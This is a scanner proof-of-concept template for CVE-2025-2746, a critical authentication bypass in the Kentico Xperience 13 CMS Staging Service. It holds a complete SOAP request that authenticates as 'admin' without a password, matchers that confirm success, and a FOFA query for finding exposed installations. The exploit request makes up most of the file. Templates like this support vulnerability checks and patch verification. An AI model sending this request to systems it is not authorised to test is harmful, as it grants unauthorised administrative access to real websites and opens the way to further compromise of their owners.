cves/2025/CVE-2025-2746.poc

## id: CVE-2025-2746
## name: Kentico Xperience 13 CMS - Staging Service Authentication Bypass (WT-2025-0011)
## author: hack007x
## severity: critical
## cve: CVE-2025-2746
## tags: cve,cve2025,kentico,stag,auth-bypass,xperience13,vuln,kev,vkev
## description: Before Kentico Xperience 13 Hotfix 173, this vulnerability can be exploited with any username provided. For Hotfix >= 173 and < 178, this vulnerability can be exploited only if you provide a valid Staging Service username (default: admin)
## affects: Upgrade to Kentico Xperience 13 Hotfix 178 or later that properly validates Staging Service authentication.
## cvss-score: 9.8
## reference: https://github.com/watchtowrlabs/kentico-xperience13-AuthBypass-wt-2025-0011
## reference: https://devnet.kentico.com/download/hotfixes
## reference: https://labs.watchtowr.com/bypassing-authentication-like-its-the-90s-pre-auth-rce-chain-s-in-kentico-xperience-cms/
## fofa-query: app="Kentico-CMS"
## verification: true

#$ rand = {{to_lower(rand_text_alpha(32))}}
POST /CMSPages/Staging/SyncServer.asmx HTTP/1.1
Host: {{Hostname}}
User-Agent: {{random_ua}}
Accept: */*
Content-Type: text/xml; charset=utf-8
SOAPAction: http://localhost/SyncWebService/SyncServer/ProcessSynchronizationTaskData

<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Header>
            <wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
                <wsse:UsernameToken>
                    <wsse:Username>admin</wsse:Username>
                </wsse:UsernameToken>
            </wsse:Security>
        </soap:Header>
        <soap:Body>
            <ProcessSynchronizationTaskData xmlns="http://localhost/SyncWebService/SyncServer">
                <stagingTaskData><![CDATA[<{{rand}}>]]></stagingTaskData>
            </ProcessSynchronizationTaskData>
        </soap:Body>
    </soap:Envelope>

#@ condition: and
#@ matcher: body contains "{{rand}}"
#@ matcher: body contains "<wsa:Action>"
#@ matcher: body not_contains "Site not running" || body not_contains "SyncServer.ErrorLicense" || body not_contains "SyncServer.ErrorServiceNotEnabled" || body not_contains "Staging service is not enabled on this server" || body not_contains "Staging does not work with blank password" || body not_contains "Missing X509 certificate token" || body not_contains "The security token could not be authenticated or authorized"





# @VEIL-STAMP: 6b4ee7e759f95872c99f658743feb0de00403d45cdebc2292fa30ca0130592aa
